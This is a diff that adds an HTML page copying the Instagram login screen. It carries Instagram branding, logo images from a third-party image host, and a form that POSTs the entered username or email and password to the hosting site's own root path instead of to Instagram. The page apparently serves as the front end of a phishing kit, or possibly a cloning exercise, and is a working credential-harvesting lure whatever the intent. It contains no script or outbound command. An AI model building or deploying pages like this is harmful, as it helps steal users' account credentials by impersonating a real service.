@@ -1,0 +1,200 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+</head>
+<body>
+    <style>
+                body{
+            background: rgb(250, 250, 250);
+            display: flex;
+            justify-content: center;
+        }
+        .container{
+            height: 350px;
+            width: 334px;
+            margin-top: 30px;
+            background: white;
+            box-shadow: 0px 0px 4px rgb(167, 167, 167);
+        }
+        .insta_logo{
+            height: 40px;
+            margin-top: 40px;
+            width: 150px;
+            cursor: pointer;
+            margin-left: 80px;
+        }
+        .email{
+            margin-left: 30px;
+            padding: 9px;
+            background: whitesmoke;
+            width: 80%;
+            border: 1px solid rgb(234, 234, 234);
+        }
+        .email:focus{
+            outline: none;
+            border-color:rgb(178, 178, 178) ;
+        }
+        ::placeholder{
+            font-size: 11px;
+            color: rgb(173, 173, 173);
+        }
+        .password{
+            margin-top: 10px;
+        }
+        .container button{
+            background: #05b4ff;
+            border: none;
+            padding: 6px;
+            width: 80%;
+            margin-left: 30px;
+            color: white;
+            border-radius: 3px;
+            font-family: sans-serif;
+            font-weight: bolder;
+        }
+        .or{
+            text-align: center;
+            font-family: sans-serif;
+            font-size: 13px;
+            color: rgb(191, 191, 191);
+        }
+        .or::before{
+            content: '';
+            position: absolute;
+            height: 1px ;
+            width: 100px;
+            background-color: rgb(191, 191, 191);
+            margin-top: 5px;
+            margin-left: 26px;
+        }
+        .or::after{
+            content: '';
+            position: absolute;
+            height: 1px ;
+            width: 95px;
+            background-color: rgb(191, 191, 191);
+            margin-top: 5px;
+            margin-left: -125px;
+        }
+        .facebook{
+            height: 14px;
+            width: 16px;
+            margin-left: 80px; 
+            cursor: pointer;
+        }
+        .fb{
+            color: rgba(6, 36, 100, 0.825);
+            font-family: sans-serif;
+            margin-left: 100px;
+            margin-top: -14px;
+            font-size: 13px;
+            font-weight: bolder;
+            cursor: pointer;
+        }
+        .forgot{
+            color: rgb(81, 80, 80);
+            font-size: 13px;
+            font-family: sans-serif;
+            margin-left: 90px;
+            font-weight: lighter;
+            margin-top: -25px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .dont{
+            padding: 2px;
+            background: white;
+            text-align: center;
+            font-family: sans-serif;
+            font-size: 14px;
+            color: rgb(50, 49, 49);
+            box-shadow: 0px 0px 4px rgb(167, 167, 167);
+
+        }
+        .dont span{
+            color: #03a6eb;
+            font-weight: bolder;
+        }
+        .get{
+            text-align: center;
+            font-family: sans-serif;
+            font-size: 13px;
+        }
+        .img img{
+            height: 35px;
+            width: 120px;
+        }
+        @media  screen and (max-width: 400px) {
+            .img img{
+                height: 30px;
+                width: 110px;
+                margin-left: 60px;
+        }
+        .facebook {
+            margin-left: 50px;
+        }
+        .fb{
+            margin-left: 70px;
+        }
+        .dont{
+            background: rgb(250, 250, 250);
+            display: flex;
+            justify-content: center;
+        }
+        .container{
+            border: none;
+            background: rgb(250, 250, 250);
+        }
+        .or::before{
+            width: 85px;
+        }
+        .or::after{
+            width: 70px;
+            margin-left: -100px;
+        }
+        }
+
+        .forgot a {
+            text-decoration: none;
+        }
+
+        .dont a {
+            text-decoration: none;
+        }
+
+        .img{
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+        }
+    </style>
+    <form action="/" method="post" class="container">
+        <img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="instagram-logo" class="insta_logo">
+        <br><br><br>
+        <input name="email" type="text" placeholder="Phone number, username or email address" class="email" required>
+        <input name="password" type="password" placeholder="Password" class="email password" required>
+        <br><br>
+        <button type="submit">Log In</button>
+        <br>
+        <p class="or">OR</p>
+        <img src="https://i.ibb.co/Dzr4DC6/facebook-logo.jpg" alt="facebook-logo" class="facebook">
+        <p class="fb">Login with Facebook</p>
+        <br><br>
+        <p class="forgot"><a href="#">Forgot your Password?</a></p>
+        <br>
+        <div class="dont">
+            <p>Dont have an account? <span> <a href="#">Sign Up</a></span></p>
+        </div>
+        <br>
+        <p class="get">Get the app.</p>
+        <div class="img">
+            <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="app_store">
+            <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="play_store">
+        </div>
+    </form>
+</body>
+</html>
